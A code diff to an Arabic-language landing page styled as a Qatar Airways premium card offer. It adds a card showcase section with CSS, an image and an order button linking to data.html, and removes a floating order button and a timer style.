@@ -83,6 +83,62 @@
             margin: 0 auto;
         }
 
+        /* Card Showcase Section (إعادة القسم المفقود) */
+        .card-showcase {
+            text-align: center;
+            margin-bottom: 50px;
+            background: linear-gradient(135deg, rgba(92, 6, 50, 0.05) 0%, rgba(212, 175, 55, 0.05) 100%);
+            padding: 40px;
+            border-radius: 25px;
+        }
+
+        .card-promo-large {
+            max-width: 450px;
+            margin: 0 auto 30px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+        }
+
+        .card-promo-large img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .card-showcase-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--qatar-maroon);
+            margin: 25px 0 15px 0;
+        }
+
+        .card-showcase-subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .order-btn-top {
+            background: var(--qatar-maroon);
+            color: #fff;
+            padding: 14px 40px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 15px;
+            display: inline-block;
+            box-shadow: 0 8px 20px rgba(92, 6, 50, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .order-btn-top:hover {
+            background: #7a0a42;
+            box-shadow: 0 12px 30px rgba(92, 6, 50, 0.4);
+            transform: translateY(-2px);
+        }
+
         /* Features Grid - Match Image Design */
         .features-grid {
             display: grid;
@@ -238,24 +294,6 @@
             margin-top: 10px;
         }
 
-        /* Order Button Floating */
-        .floating-order-btn {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: var(--qatar-maroon);
-            color: #fff;
-            padding: 12px 40px;
-            border-radius: 30px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 16px;
-            box-shadow: 0 8px 20px rgba(92, 6, 50, 0.4);
-            z-index: 1000;
-            display: none;
-        }
-
         /* Footer Styling */
         footer {
             background-color: var(--qatar-maroon);
@@ -301,9 +339,6 @@
                 padding-right: 0;
                 width: 100%;
             }
-            .promo-timer-box {
-                margin: 10px 0;
-            }
         }
 
         @media (max-width: 576px) {
@@ -315,10 +350,8 @@
                 grid-template-columns: repeat(2, 1fr);
                 gap: 15px;
             }
-            .floating-order-btn {
-                display: block;
-                width: 90%;
-                text-align: center;
+            .card-showcase-title {
+                font-size: 22px;
             }
         }
     </style>
@@ -345,6 +378,16 @@
         </video>
         
         <div class="content-section">
+            <!-- Card Showcase Section (إعادة القسم المفقود) -->
+            <div class="card-showcase">
+                <div class="card-promo-large">
+                    <img src="images/watches/card1.png" alt="بطاقة الخطوط الجوية القطرية المميزة">
+                </div>
+                <h2 class="card-showcase-title">بطاقة مميزة من الخطوط الجوية القطرية</h2>
+                <p class="card-showcase-subtitle">احصل على بطاقتك الآن خلال دقائق واستمتع بعالم من الرفاهية والمزايا التي لا تنتهي</p>
+                <a href="data.html" class="order-btn-top">احصل على بطاقتك الآن</a>
+            </div>
+
             <!-- Features Grid - Match Image Design -->
             <div class="features-grid">
                 <!-- Parking -->
@@ -432,14 +475,8 @@
             </div>
             
             <div class="terms-text">تطبق الشروط والأحكام.</div>
-            
-            <div style="text-align: center; margin-top: 30px;">
-                <a href="data.html" class="lang-btn" style="padding: 15px 50px; font-size: 18px; border-radius: 30px;">ابدأ الطلب الآن</a>
-            </div>
         </div>
     </div>
-
-    <a href="data.html" class="floating-order-btn">اطلب بطاقتك الآن</a>
 
     <footer>
         <div class="footer-container">
